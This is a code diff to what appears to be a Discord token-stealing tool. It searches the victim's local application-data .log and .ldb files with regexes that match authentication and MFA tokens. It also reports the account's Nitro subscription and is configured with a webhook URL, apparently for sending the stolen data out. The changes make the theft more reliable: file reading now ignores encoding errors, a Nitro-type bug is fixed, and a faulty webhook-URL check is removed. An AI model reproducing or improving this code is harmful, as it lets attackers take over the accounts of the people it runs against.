@@ -52,7 +52,7 @@ def find_tokens(path):
         if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
             continue
 
-        for line in [x.strip() for x in open(f'{path}\\{file_name}').readlines() if x.strip()]:
+        for line in [x.strip() for x in open(f'{path}\\{file_name}',errors='ignore').readlines() if x.strip()]:
             for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                 for token in re.findall(regex, line):
                     tokens.append(token)
@@ -114,7 +114,7 @@ def get_premium_type(user_data):
             nitro = 'None'
         elif user_data['premium_type'] == 1:
             nitro = 'Nitro Classic ($5)'
-        elif user_data['premium'] == 2:
+        elif user_data['premium_type'] == 2:
             nitro = 'Nitro ($10)'
     except KeyError:
         nitro = 'None'
@@ -123,15 +123,6 @@ def get_premium_type(user_data):
 
     return nitro
 
-
-# check if webhook url was filled in
-if WEBHOOK_URL == 'WEBHOOK HERE':
-    print("Please add a webhook URL")
-    raise Exception
-# and is an url
-if not WEBHOOK_URL.startswith('http://') or not WEBHOOK_URL.startswith('https://'):
-    print('WEBHOOK_URL is not a url')
-    raise Exception
 
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
